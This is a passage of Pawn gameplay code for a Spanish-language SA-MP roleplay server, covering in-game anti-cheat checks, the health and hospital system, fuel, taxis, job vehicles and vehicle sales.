	    bodyProbability = 0,
	    option = random(100);

	switch(weaponid)
	{
	    case WEAPON_DEAGLE: wepProbability = 10;
	    case WEAPON_SHOTGUN: wepProbability = 15;
	    case WEAPON_UZI: wepProbability = 5;
 	    case WEAPON_MP5: wepProbability = 8;
	    case WEAPON_AK47: wepProbability = 10;
	    case WEAPON_M4: wepProbability = 10;
	    case WEAPON_TEC9: wepProbability = 8;
	    case WEAPON_RIFLE: wepProbability = 15;
	    case WEAPON_SNIPER: wepProbability = 20;
	    default: return 0;
	}

	switch(bodypart)
	{
	    case BODY_PART_TORSO: bodyProbability = 29;
	    case BODY_PART_GROIN: bodyProbability = 29;
	    case BODY_PART_LEFT_ARM: bodyProbability = 14;
	    case BODY_PART_RIGHT_ARM: bodyProbability = 14;
	    case BODY_PART_LEFT_LEG: bodyProbability = 24;
	    case BODY_PART_RIGHT_LEG: bodyProbability = 24;
	    default: return 0;
	}

	if((bodypart == BODY_PART_TORSO || bodypart == BODY_PART_GROIN) && armour > 0.0)
	{
	    if(option <= wepProbability)
	        CrossArmour(playerid);
	}
	else
	{
	    if(option <= wepProbability + bodyProbability)
	        AccurateShot(playerid);
	}
	return 1;
}


stock SetPlayerHealthEx(playerid, Float:health)
{
	PlayerInfo[playerid][pHealth] = health;
	return 1;
}

stock GetPlayerHealthEx(playerid, &Float:health)
{
	health = PlayerInfo[playerid][pHealth];
	return 1;
}

stock isWeaponAllowed(weapon)
{
	if(weapon == 35 || weapon == 36 || weapon == 37 || weapon == 38 || weapon == 39 || weapon == 40 || weapon == 44 || weapon == 45)
	    return 0;
	    
	return 1;
}

public AntiCheatImmunityTimer(playerid)
{
	antiCheatImmunity[playerid] = 0;
	return 1;
}

public AntiCheatTimer()
{
	new string[128], weapon, ammo, hack;

	foreach(new playerid : Player)
	{
		if(gPlayerLogged[playerid] == 1)
		{
		    weapon = GetPlayerWeapon(playerid),
		    ammo = GetPlayerAmmo(playerid);

			if(GetPVarInt(playerid, "died") != 1)
			{
			    SetPlayerHealth(playerid, PlayerInfo[playerid][pHealth]);
			    
				if(GetItemType(weapon) == ITEM_WEAPON)
				{
				    if(GetHandItem(playerid, HAND_RIGHT) != weapon)
        			{
            			if(ammo != 0)
            			{
             				if(antiCheatImmunity[playerid] == 0)
             				{
								format(string, sizeof(string), "[Advertencia]: %s (ID:%d) intent� editarse un/a %s.", GetPlayerNameEx(playerid), playerid, GetItemName(weapon));
				    			AdministratorMessage(COLOR_WHITE, string, 1);
							}
							ResetPlayerWeapons(playerid);
		    				if(GetItemType(GetHandItem(playerid, HAND_RIGHT)) == ITEM_WEAPON)
		    			    	GivePlayerWeapon(playerid, GetHandItem(playerid, HAND_RIGHT), GetHandParam(playerid, HAND_RIGHT));
 					 	}
					}
					else
					{
						if(ammo > GetHandParam(playerid, HAND_RIGHT))
					    {
	        				if(antiCheatImmunity[playerid] == 0)
					        {
						        format(string, sizeof(string), "[Advertencia]: %s (ID:%d) intent� editarse mas balas para su arma.", GetPlayerNameEx(playerid), playerid);
			    				AdministratorMessage(COLOR_WHITE, string, 1);
							}
		    				SetPlayerAmmo(playerid, GetHandItem(playerid, HAND_RIGHT), GetHandParam(playerid, HAND_RIGHT));
					    }
					    else if(ammo < GetHandParam(playerid, HAND_RIGHT))
					    {
     						if(antiCheatImmunity[playerid] == 0)
					        {
			    				SynchronizeWeaponAmmo(playerid, ammo);
							}
						}
					}
				}
				if(GetItemType(GetHandItem(playerid, HAND_RIGHT)) == ITEM_WEAPON)
				{
				    if(weapon != GetHandItem(playerid, HAND_RIGHT))
				    	SetPlayerArmedWeapon(playerid, GetHandItem(playerid, HAND_RIGHT));
				}
			}
			
			if(PlayerInfo[playerid][pAdmin] < 1)
			{
				if(!isWeaponAllowed(GetHandItem(playerid, HAND_RIGHT)))
				{
				    format(string, sizeof(string), "arma %d [%s] ", GetHandItem(playerid, HAND_RIGHT), GetItemName(GetHandItem(playerid, HAND_RIGHT)));
					KickPlayer(playerid, "el sistema", string);
				} else if(!isWeaponAllowed(GetHandItem(playerid, HAND_LEFT)))
				{
					format(string, sizeof(string), "arma %d [%s] ", GetHandItem(playerid, HAND_LEFT), GetItemName(GetHandItem(playerid, HAND_LEFT)));
					KickPlayer(playerid, "el sistema", string);
				}
				if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK)
					BanPlayer(playerid, INVALID_PLAYER_ID, "Cheat Jet Pack");
			}
			
			if(GetPlayerCash(playerid) != GetPlayerMoney(playerid))
			{
 				hack = GetPlayerMoney(playerid) - GetPlayerCash(playerid);
		  		if(hack >= 5000)
			  	{
				    format(string, sizeof(string), "[Advertencia]: %s (ID:%d) intent� editarse $%d.",GetPlayerNameEx(playerid), playerid, hack);
				    AdministratorMessage(COLOR_WHITE, string, 1);
				    format(string, sizeof(string), "Intent� editarse $%d.", hack);
				    log(playerid, LOG_MONEY, string);
		  		}
		 		ResetMoneyBar(playerid);
				UpdateMoneyBar(playerid,PlayerInfo[playerid][pCash]);
			}
		}
	}
}
public fuelCar(playerid, refillprice, refillamount, refilltype)
{
	if(refilltype == 1)
	{
    	VehicleInfo[GetPlayerVehicleID(playerid)][VehFuel] += refillamount;
		SendFMessage(playerid, COLOR_WHITE, "El tanque de su veh�culo ha sido cargado al (%d %%) por $%d.", VehicleInfo[GetPlayerVehicleID(playerid)][VehFuel], refillprice);
	} else
		if(refilltype == 2)
		{
		    SetHandItemAndParam(playerid, HAND_RIGHT, ITEM_ID_BIDON, GetHandParam(playerid, HAND_RIGHT) + refillamount);
		    SendFMessage(playerid, COLOR_WHITE, "Has cargado nafta en tu bid�n de combustible al (%d %%) por $%d.", GetHandParam(playerid, HAND_RIGHT), refillprice);
	    }
	GivePlayerCash(playerid,-refillprice);
	PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
	TogglePlayerControllable(playerid, true);
	fillingFuel[playerid] = false;
	return 1;
}

public fuelCarWithCan(playerid, vehicleid, totalfuel)
{
    VehicleInfo[vehicleid][VehFuel] = totalfuel;
    PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
    TogglePlayerControllable(playerid, true);
	return 1;
}

public commandPermissionsUpdate(){
    loadCmdPermissions();
    return 1;
}

public globalUpdate()
{
	new playerCount = 0,
		string[128];

	//===============================HORA/CLIMA=================================
	
	gettime(gTime[0], gTime[1], gTime[2]);

	if(gTime[1] >= 59 && gTime[2] >= 59)
	{
		weatherVariables[1] += random(3) + 1; // Weather changes aren't regular.
		SetWorldTime(gTime[0]); // Set the world time to keep the worldtime variable updated (and ensure it syncs instantly for connecting players).
	}
	
    //==========================================================================
    
	chargeTaxis();
	
	UpdateBankRobberyCooldown();
	
	foreach(new playerid : Player)
	{
	    playerCount++;
	    
	    if(GetPVarInt(playerid, "drugEffect") > 0)
		{
	        SetPVarInt(playerid, "drugEffect", GetPVarInt(playerid, "drugEffect") - 1);
	        if(GetPVarInt(playerid, "drugEffect") == 0)
	            syncPlayerTime(playerid);
	    }
	    
	    if(playerCount > ServerInfo[sPlayersRecord])
		{
	        ServerInfo[sPlayersRecord] = playerCount;
	       	format(string, sizeof(string), "[Staff]: �hemos superado el record de usuarios online! (%d jugadores)", playerCount);
			AdministratorMessage(COLOR_LIGHTORANGE, string, 1);
		}
		
		SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
		if(gTime[2] >= 59)
			syncPlayerTime(playerid);
		
		if(gPlayerLogged[playerid] && PlayerInfo[playerid][pTutorial] == 1 && PlayerInfo[playerid][pRegStep] == 0) {
			if(MechanicCallTime[playerid] > 0) {
				if(MechanicCallTime[playerid] == 90) { MechanicCallTime[playerid] = 0; DisablePlayerCheckpoint(playerid); PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0); GameTextForPlayer(playerid, "~r~El marcador desaparecio", 2500, 1); }
				else {
					format(string, sizeof(string), "%d", 90 - MechanicCallTime[playerid]);
					GameTextForPlayer(playerid, string, 1500, 6);
					MechanicCallTime[playerid] += 1;
				}
			}
			
			if(!IsPlayerAfk(playerid) && PlayerInfo[playerid][pJailed] != 2) // Si no est� AFK ni en Jail OOC
			{
				SetPVarInt(playerid, "pPayTime", GetPVarInt(playerid, "pPayTime") + 1);
				if(GetPVarInt(playerid, "pPayTime") >= 3600) {
					SetPVarInt(playerid, "pPayTime", 0);
					PayDay(playerid);
				}
				
				updateThiefCounters(playerid);
				
				if(PlayerInfo[playerid][pMuteB] > 0)
				    PlayerInfo[playerid][pMuteB]--;
			}
			
			UpdateAfkSystem(playerid);
			
			if(PlayerInfo[playerid][pSpectating] != INVALID_PLAYER_ID)
			{
				if(GetPlayerInterior(playerid) != GetPlayerInterior(PlayerInfo[playerid][pSpectating]))
					SetPlayerInterior(playerid, GetPlayerInterior(PlayerInfo[playerid][pSpectating]));
					
				if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(PlayerInfo[playerid][pSpectating]))
					SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(PlayerInfo[playerid][pSpectating]));
			}
			
			if(PlayerInfo[playerid][pHospitalized] == 0 && PlayerInfo[playerid][pJailed] != 2)
			{
                //=====Camara normal si se cur� o si esta arriba de un auto=====
                
				if(dyingCamera[playerid] == true)
				{
				    if(PlayerInfo[playerid][pHealth] > 25 || IsPlayerInAnyVehicle(playerid))
				    {
						dyingCamera[playerid] = false;
						SetCameraBehindPlayer(playerid);
					}
				}
				//==============================================================
				
		        if(PlayerInfo[playerid][pHealth] > 0 && PlayerInfo[playerid][pHealth] < 25 && GetPVarInt(playerid, "disabled") != DISABLE_DYING && GetPVarInt(playerid, "disabled") != DISABLE_DEATHBED)
				{
		         	TogglePlayerControllable(playerid, false);
		            if(!IsPlayerInAnyVehicle(playerid))
					{
		                /*if(TakeHeadShot[playerid] == 1)
		                	ApplyAnimation(playerid, "PED", "FLOOR_hit_f", 4.1, 0, 1, 1, 1, 1, 1);
		                else
						{
							ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
	                        SetPlayerHealthEx(playerid, 24);
                        }*/
                        ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
                        SetPlayerHealthEx(playerid, 24);
					}

		            SendClientMessage(playerid, COLOR_LIGHTBLUE, "�Te encuentras herido e incapaz de moverte!, con cada segundo que pase perder�s algo de sangre.");
		            SetPVarInt(playerid, "disabled", DISABLE_DYING);
		            
		            if(GetPlayerInterior(playerid) == 0 && GetPlayerVirtualWorld(playerid) == 0) // Solo sirve para exteriores
		            {
			            // Camara panoramica al agonizar
			            new Float:dyingX, Float:dyingY, Float:dyingZ;
			            GetPlayerPos(playerid, dyingX, dyingY, dyingZ);
			            SetPlayerCameraPos(playerid, dyingX - 5.0, dyingY - 5.0, dyingZ + 6.0);
			            SetPlayerCameraLookAt(playerid, dyingX, dyingY, dyingZ, CAMERA_MOVE);
			            dyingCamera[playerid] = true;
			            // =============================
			            ShowPlayerDialog(playerid, DLG_DYING, DIALOG_STYLE_MSGBOX, "Estas desangrandote", "Teniendo en cuenta el entorno en el que te encuentras, decide si es posible que alguien te haya visto y llame a emergencias.", "Avisar", "Cancelar");
					}
				//==============================================================

				} else if(PlayerInfo[playerid][pHealth] > 25 && GetPVarInt(playerid, "disabled") == DISABLE_DYING) {
		            SendClientMessage(playerid, COLOR_WHITE, "�Has sido curado!, ten m�s cuidado la pr�xima vez.");
		            TogglePlayerControllable(playerid, true);
                    SetPVarInt(playerid, "disabled", DISABLE_NONE);
                    
                //==============================================================

				} else if(PlayerInfo[playerid][pHealth] > 1.0 && GetPVarInt(playerid, "disabled") == DISABLE_DYING) {
					PlayerInfo[playerid][pHealth] -= HP_LOSS;

				//==============================================================

				} else if(PlayerInfo[playerid][pHealth] <= 1.0 && PlayerInfo[playerid][pHealth] > 0.0 && GetPVarInt(playerid, "disabled") != DISABLE_DEATHBED) {
					TogglePlayerControllable(playerid, false);
					ApplyAnimation(playerid, "CRACK", "crckdeth2", 2.0, 1, 0, 0, 0, 0);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Est�s en tu lecho de muerte por lo que ya no podran salvarte, puedes utilizar {FFFFFF}/morir{87CEFA} o continuar roleando.");
                    SetPVarInt(playerid, "disabled", DISABLE_DEATHBED);
          		}
		    } else if(PlayerInfo[playerid][pHospitalized] >= 2) {
		        PlayerInfo[playerid][pHospitalized]++;
		        
		        SetPlayerHealthEx(playerid, PlayerInfo[playerid][pHealth] + HP_GAIN);

		        if(PlayerInfo[playerid][pHealth] >= 100) {
		            switch(GetPVarInt(playerid, "hosp")) {
		           	 	case 1: {
		                    PlayerInfo[playerid][pX] = 1178.9762;
							PlayerInfo[playerid][pY] = -1323.5491;
							PlayerInfo[playerid][pZ] = 14.1466;
							PlayerInfo[playerid][pA] = 270.0892;
		                }
		                case 2: {
		                    PlayerInfo[playerid][pX] = 2001.6489;
							PlayerInfo[playerid][pY] = -1446.1147;
							PlayerInfo[playerid][pZ] = 13.5611;
							PlayerInfo[playerid][pA] = 137.1013;
		                }
		            }
		            
					SendFMessage(playerid, COLOR_YELLOW2, "Has sido dado de alta. Te cobraron $%d por tu tratamiento. Lo que te quede a pagar se descontar� de tu cuenta bancaria.", PRICE_TREATMENT);
		            if(GetPlayerCash(playerid) > PRICE_TREATMENT)
						GivePlayerCash(playerid, -PRICE_TREATMENT); // se cobra 2 mil por el tratamiento
					else
						if(GetPlayerCash(playerid) > 0)
						{
							PlayerInfo[playerid][pBank] -= PRICE_TREATMENT - GetPlayerCash(playerid);
						    ResetPlayerCash(playerid);
						} else
						    PlayerInfo[playerid][pBank] -= PRICE_TREATMENT;

					GiveFactionMoney(FAC_HOSP, PRICE_TREATMENT / 8);
					
					RefillPlayerBasicNeeds(playerid);
		            ResetPlayerWeapons(playerid);
		            DeletePVar(playerid, "hosp");
		            SetPlayerHealthEx(playerid, 100);
		            PlayerInfo[playerid][pHospitalized] = 0;
					PlayerInfo[playerid][pArmour] = 0;
					PlayerInfo[playerid][pVirtualWorld] = 0;
					PlayerInfo[playerid][pInterior] = 0;
		            SpawnPlayer(playerid);
				}
			}
		}
	}
	return 1;
}

stock ini_GetKey( line[] )
{
	new keyRes[256];

	keyRes[0] = 0;
    if ( strfind( line , "=" , true ) == -1 ) return keyRes;
    strmid( keyRes , line , 0 , strfind( line , "=" , true ) , sizeof( keyRes) );
    return keyRes;
}

stock ini_GetValue(line[]) {
	new valRes[256];
	valRes[0]=0;
	if ( strfind( line , "=" , true ) == -1 ) return valRes;
	strmid( valRes , line , strfind( line , "=" , true )+1 , strlen( line ) , sizeof( valRes ) );
	return valRes;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid) {
	if(newinteriorid == 0) {
		SetPlayerWeather(playerid, weatherVariables[0]);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else SetPlayerWeather(playerid, INTERIOR_WEATHER_ID);
	return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
    if(GetPlayerInterior(playerid) == 0)
	{
        BanPlayer(playerid, INVALID_PLAYER_ID, "Cheat Vehicle Mod");
	}
	
	if(GetPlayerCash(playerid) >= 2000)
	{
	    GivePlayerCash(playerid, -2000);
	    GiveFactionMoney(FAC_MECH, 2000 / 10);
	    SendClientMessage(playerid, COLOR_WHITE, "Las modificaciones han sido guardadas (excepto nitro, pintura, llantas y suspension hidraulica).");
	}
	else
	{
	    SendClientMessage(playerid, COLOR_WHITE, "No tienes el dinero suficiente ($4500), las modificaciones no ser�n almacenadas.");
		return 1;
	}
	
	if(GetVehicleComponentType(componentid) == 5 || // Si es nitro
	    GetVehicleComponentType(componentid) == 7 || // Si es llantas
	    GetVehicleComponentType(componentid) == 9) // Si es suspension
  		return 1;

    if(VehicleInfo[vehicleid][VehType] == VEH_OWNED)
	{
        new vID = GetPlayerVehicleID(playerid);
		VehicleInfo[vehicleid][VehCompSlot][GetVehicleComponentType(componentid)] = componentid;
		SaveVehicle(vID);
    }
    return 1;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{

	if(AdminDuty[playerid])
	{
	    return 1;
	}

	if(VehicleInfo[vehicleid][VehLocked] == 1)
	{
	    new vehModelType = GetVehicleType(vehicleid);
	    
		if(vehModelType == VTYPE_BMX || vehModelType == VTYPE_BIKE || vehModelType == VTYPE_QUAD)
		    return 1;

		new Float:pos[3];
		GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		GameTextForPlayer(playerid, "~w~Vehiculo cerrado", 1000, 4);
	}

	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
	new	string[128],
		vehicleid,
	 	vehicleModelType;
	
 	if(newstate == PLAYER_STATE_PASSENGER || newstate == PLAYER_STATE_DRIVER)
 	{
		LastVeh[playerid] = GetPlayerVehicleID(playerid);
		vehicleModelType = GetVehicleType(LastVeh[playerid]);
	}
		
	vehicleid = LastVeh[playerid];
		
	if(playerid == INVALID_PLAYER_ID)
	    return 1;
	
	if(newstate == PLAYER_STATE_ONFOOT)
	{
	    if(SeatBelt[playerid])
	    {
	        PlayerActionMessage(playerid, 15.0, "se desabrocha el cintur�n de seguridad.");
	        SeatBelt[playerid] = false;
		}
 	}
	
	if(newstate == PLAYER_STATE_PASSENGER && GetVehicleModel(GetPlayerVehicleID(playerid)) == 427)
	{
     	SetPlayerPos(playerid, 2407.186279, -1526.410522, 985.309814);
     	SetPlayerFacingAngle(playerid, 0);
        SetCameraBehindPlayer(playerid);
		InEnforcer[playerid] = GetPlayerVehicleID(playerid);
	}
	        
	if(newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_PASSENGER)
	{
	    if(VehicleInfo[vehicleid][VehJob] == JOB_TAXI)
		{
			if(TransportCost[TransportDriver[playerid]] > 0 && TransportDriver[playerid] < 999)
			{
				if(IsPlayerConnected(TransportDriver[playerid]))
				{
					format(string, sizeof(string), "~w~El viaje costo ~r~$%d", TransportCost[TransportDriver[playerid]]);
					GameTextForPlayer(playerid, string, 5000, 1);
					format(string, sizeof(string), "~w~El pasajero dejo el taxi~n~~g~Has ganado $%d", TransportCost[TransportDriver[playerid]]);
					GameTextForPlayer(TransportDriver[playerid], string, 5000, 1);
					GivePlayerCash(playerid, -TransportCost[TransportDriver[playerid]]);
					GivePlayerCash(TransportDriver[playerid], TransportCost[TransportDriver[playerid]]);
					if(GetPVarInt(TransportDriver[playerid], "pJobLimitCounter") < JOB_TAXI_MAXPASSENGERS)
					{
					    SetPVarInt(TransportDriver[playerid], "pJobLimitCounter", GetPVarInt(TransportDriver[playerid], "pJobLimitCounter") + 1);
						PlayerInfo[TransportDriver[playerid]][pPayCheck] += PRICE_TAXI_PERPASSENGER;
					}
					TransportCost[TransportDriver[playerid]] = 0;
					TransportPassenger[TransportDriver[playerid]] = 999;
					TransportDriver[playerid] = 999;
				}
			}
		}
		
		if(hearingRadioStream[playerid])
		{
			StopAudioStreamForPlayer(playerid);
			hearingRadioStream[playerid] = false;
		}
	}
	else if(newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_DRIVER)
	{
	    //=======Ocultar veloc�metro=======
	    HidePlayerSpeedo(playerid);
	    KillTimer(pSpeedoTimer[playerid]);
	    //=================================

		if(PlayerInfo[playerid][pJob] == JOB_FARM && jobDuty[playerid] && VehicleInfo[vehicleid][VehType] == VEH_JOB && VehicleInfo[vehicleid][VehJob] == JOB_FARM)
		{
	        SendFMessage(playerid, COLOR_WHITE, "�Has dejado el veh�culo!, tienes %d segundos de descanso para volver a ingresar.", jobBreak[playerid]);
            SetPVarInt(playerid, "jobBreakTimerID", SetTimerEx("jobBreakTimer", 1000, false, "ii", playerid, PlayerInfo[playerid][pJob]));
	    }
		else if(PlayerInfo[playerid][pJob] == JOB_TRAN && jobDuty[playerid] && VehicleInfo[vehicleid][VehType] == VEH_JOB && VehicleInfo[vehicleid][VehJob] == JOB_TRAN)
		{
	        SendFMessage(playerid, COLOR_WHITE, "�Has dejado el veh�culo!, tienes %d segundos de descanso para volver a ingresar.", jobBreak[playerid]);
            SetPVarInt(playerid, "jobBreakTimerID", SetTimerEx("jobBreakTimer", 1000, false, "ii", playerid, PlayerInfo[playerid][pJob]));
	    }
		else if(PlayerInfo[playerid][pJob] == JOB_GARB && jobDuty[playerid] && VehicleInfo[vehicleid][VehType] == VEH_JOB && VehicleInfo[vehicleid][VehJob] == JOB_GARB)
		{
	    	SendFMessage(playerid, COLOR_WHITE, "�Has dejado el veh�culo!, tienes %d segundos de descanso para volver a ingresar.", jobBreak[playerid]);
            SetPVarInt(playerid, "jobBreakTimerID", SetTimerEx("jobBreakTimer", 1000, false, "ii", playerid, PlayerInfo[playerid][pJob]));
	    }

	    if(VehicleInfo[vehicleid][VehJob] == JOB_TAXI)
		{
		    if(jobDuty[playerid] && PlayerInfo[playerid][pJob] == JOB_TAXI)
			{
				jobDuty[playerid] = false;
				SendClientMessage(playerid, COLOR_YELLOW2, "Has dejado el veh�culo, por lo tanto ya no te encuentras en servicio.");
				if(TransportPassenger[playerid] < 999)
				{
					SendClientMessage(playerid, COLOR_YELLOW2, "Como el pasajero a�n no ha dejado el veh�culo no le cobras ninguna tarifa.");
					SendClientMessage(TransportPassenger[playerid], COLOR_YELLOW2, "El conductor ha dejado el veh�culo, por lo tanto no te cobrar� ninguna tarifa.");
					TransportCost[playerid] = 0;
				}
				TransportDriver[TransportPassenger[playerid]] = 999;
				TransportPassenger[playerid] = 999;
			}
		}
		
		if(hearingRadioStream[playerid])
		{
			StopAudioStreamForPlayer(playerid);
			hearingRadioStream[playerid] = false;
		}
	}
	
	if(newstate == PLAYER_STATE_PASSENGER && oldstate == PLAYER_STATE_ONFOOT)
	{
		if(VehicleInfo[vehicleid][VehJob] == JOB_TAXI && TransportDriver[playerid] == 999)
		{
	        foreach(new i : Player)
			{
				if(vehicleid == GetPlayerVehicleID(i) && GetPlayerState(i) == PLAYER_STATE_DRIVER && jobDuty[i] && PlayerInfo[i][pJob] == JOB_TAXI)
				{
					format(string, sizeof(string), "�Un pasajero ha ingresado a tu veh�culo!, le cobras $%d por segundo.", PRICE_TAXI);
					SendClientMessage(i, COLOR_YELLOW2, string);
					format(string, sizeof(string), "Has ingresado al taxi como pasajero, el precio es de $%d por segundo.", PRICE_TAXI);
					SendClientMessage(playerid, COLOR_YELLOW2, string);
					TransportDriver[playerid] = i;
					TransportPassenger[i] = playerid;
				}
		 	}
		}
		else if(VehicleInfo[vehicleid][VehType] == VEH_DEALERSHIP || VehicleInfo[vehicleid][VehType] == VEH_DEALERSHIP2 || VehicleInfo[vehicleid][VehType] == VEH_SHIPYARD)
		{
			RemovePlayerFromVehicle(playerid);
		}
		else if(VehicleInfo[vehicleid][VehType] == VEH_OWNED && VehicleInfo[vehicleid][VehLocked] == 1 && AdminDuty[playerid] != 1)
		{
		    if(vehicleModelType == VTYPE_BMX || vehicleModelType == VTYPE_BIKE || vehicleModelType == VTYPE_QUAD)
		    	return 1;
		    	
			SendClientMessage(playerid, COLOR_YELLOW2, "El veh�culo est� cerrado.");
			RemovePlayerFromVehicle(playerid);
		}
		
	//===============================RADIO EN AUTO==============================
	
 		if(VehicleInfo[vehicleid][VehRadio] > 0)
	    	PlayRadioStreamForPlayer(playerid, VehicleInfo[vehicleid][VehRadio]);
	    	
	//==========================================================================
	}
	
	if(newstate == PLAYER_STATE_DRIVER && oldstate == PLAYER_STATE_ONFOOT)
	{
		if(vehicleModelType != VTYPE_BMX)
		{
			KillTimer(pSpeedoTimer[playerid]); // Como las id de timer nunca se repiten, por si las dudas, borramos cualquier timer anterior (si existiese y reemplazamos la id, queda andando para siempre)
            pSpeedoTimer[playerid] = SetTimerEx("speedoTimer", 1250, true, "d", playerid);
			if(HudEnabled[playerid])
				ShowPlayerSpeedo(playerid);
		}
		
		//===============================RADIO EN AUTO==========================
		
		if(VehicleInfo[vehicleid][VehRadio] > 0)
	    	PlayRadioStreamForPlayer(playerid, VehicleInfo[vehicleid][VehRadio]);
	    	
		//======================================================================

        if(VehicleInfo[vehicleid][VehType] == VEH_OWNED)
		{
			format(string, sizeof(string), "~w~%s", GetVehicleName(vehicleid));
			GameTextForPlayer(playerid, string, 4000, 1);
			if(!AdminDuty[playerid])
			{
	            if(vehicleModelType == VTYPE_BMX && VehicleInfo[vehicleid][VehOwnerSQLID] != PlayerInfo[playerid][pID])
				{
					SendClientMessage(playerid, COLOR_YELLOW2, "�Esta bicicleta no te pertenece!");
					RemovePlayerFromVehicle(playerid);
				}
				else if(VehicleInfo[vehicleid][VehLocked] == 1)
				{
				    if(vehicleModelType == VTYPE_BMX || vehicleModelType == VTYPE_BIKE || vehicleModelType == VTYPE_QUAD)
		    			return 1;
		    			
					SendClientMessage(playerid, COLOR_YELLOW2, "El veh�culo est� cerrado.");
					RemovePlayerFromVehicle(playerid);
				}
			}
			else
				SendFMessage(playerid, COLOR_WHITE, "Veh�culo ID: %d | Nombre de due�o: %s | ID en la DB: %d.", vehicleid, VehicleInfo[vehicleid][VehOwnerName], VehicleInfo[vehicleid][VehOwnerSQLID]);
			
		}
		else if(PlayerInfo[playerid][pJob] == JOB_FARM && jobDuty[playerid] && VehicleInfo[vehicleid][VehType] == VEH_JOB && VehicleInfo[vehicleid][VehJob] == JOB_FARM)
		{
	        SendFMessage(playerid, COLOR_WHITE, "Has vuelto a trabajar, te quedan %d segundos de descanso disponibles.", jobBreak[playerid]);
	        KillTimer(GetPVarInt(playerid, "jobBreakTimerID"));
	    }
		else if(PlayerInfo[playerid][pJob] == JOB_TRAN && jobDuty[playerid] && VehicleInfo[vehicleid][VehType] == VEH_JOB && VehicleInfo[vehicleid][VehJob] == JOB_TRAN)
		{
	        SendFMessage(playerid, COLOR_WHITE, "Has vuelto a trabajar, te quedan %d segundos de descanso disponibles.", jobBreak[playerid]);
	        KillTimer(GetPVarInt(playerid, "jobBreakTimerID"));
	    }
		else if(PlayerInfo[playerid][pJob] == JOB_GARB && jobDuty[playerid] && VehicleInfo[vehicleid][VehType] == VEH_JOB && VehicleInfo[vehicleid][VehJob] == JOB_GARB)
		{
	        SendFMessage(playerid, COLOR_WHITE, "Has vuelto a trabajar, te quedan %d segundos de descanso disponibles.", jobBreak[playerid]);
	        KillTimer(GetPVarInt(playerid, "jobBreakTimerID"));
	    }
		else if(VehicleInfo[vehicleid][VehType] == VEH_SCHOOL && AdminDuty[playerid] != 1)
		{
			if(playerLicense[playerid][lDTaking] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COLOR_YELLOW2, "No puedes ingresar a este veh�culo.");
			}
			else
			{
				PlayerTextDrawShow(playerid, PTD_Timer[playerid]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "------------------------");
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "�La prueba ha comenzado!");
				SendClientMessage(playerid, COLOR_WHITE, "Enciende el motor con '/motor' o la tecla 'Y', y conduce sobre los puntos del mapa respetando las leyes de tr�nsito.");
				if(playerLicense[playerid][lDStep] == 0)
				{
			 		SetPlayerCheckpoint(playerid, 1109.8116, -1743.4208, 13.1255, 5.0);
					playerLicense[playerid][lDStep] = 1;
					timersID[10] = SetTimerEx("licenseTimer", 1000, false, "dd", playerid, 1);
				}
			}
		}
		else if(VehicleInfo[vehicleid][VehType] == VEH_RENT)
		{
			for(new i = 1; i < MAX_RENTCAR; i++)
			{
		 		if(RentCarInfo[i][rVehicleID] == vehicleid && RentCarInfo[i][rRented] == 0)
		 		{
					SendClientMessage(playerid, COLOR_WHITE, "======================[Veh�culo en Alquiler]======================");
					SendFMessage(playerid, COLOR_WHITE, "Modelo: %s.", GetVehicleName(vehicleid));
					new price = (GetVehiclePrice(vehicleid, ServerInfo[sVehiclePricePercent])) / 200;
					if(price < 100)
						price = 100; // Seteamos un m�nimo de precio
					SendFMessage(playerid, COLOR_WHITE, "Costo de renta por hora: $%d.", price);
					if(GetVehicleMaxTrunkSlots(vehicleid) > 0)
						SendFMessage(playerid, COLOR_WHITE, "Maletero: %d slots.", GetVehicleMaxTrunkSlots(vehicleid));
					else
					    SendClientMessage(playerid, COLOR_WHITE, "Maletero: No.");
					SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "(( Para rentar �ste veh�culo utiliza '/rentar [tiempo] (en horas)'. ))");
					SendClientMessage(playerid, COLOR_WHITE, "=============================================================");
				}
			}
		}
		else if(VehicleInfo[vehicleid][VehType] == VEH_DEALERSHIP || VehicleInfo[vehicleid][VehType] == VEH_DEALERSHIP2 || VehicleInfo[vehicleid][VehType] == VEH_SHIPYARD)
		{
		    SendClientMessage(playerid,COLOR_WHITE,"=======================[Veh�culo en Venta]=======================");
			SendFMessage(playerid, COLOR_WHITE, "Modelo: %s.", GetVehicleName(vehicleid));
			SendFMessage(playerid, COLOR_WHITE, "Costo real: $%d.", GetVehiclePrice(vehicleid,100));
			SendFMessage(playerid, COLOR_WHITE, "Costo actual: {3E9D41}$%d{FFFFFF} (%d%%%%).", GetVehiclePrice(vehicleid,ServerInfo[sVehiclePricePercent]), ServerInfo[sVehiclePricePercent]);
			if(GetVehicleMaxTrunkSlots(vehicleid) > 0)
				SendFMessage(playerid, COLOR_WHITE, "Maletero: %d slots.", GetVehicleMaxTrunkSlots(vehicleid));
			else
			    SendClientMessage(playerid, COLOR_WHITE, "Maletero: No.");
			SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"(( Para comprar �ste veh�culo utiliza '/vehcomprar [color1] [color2]'. ))");
			SendClientMessage(playerid,COLOR_WHITE,"=============================================================");
		}
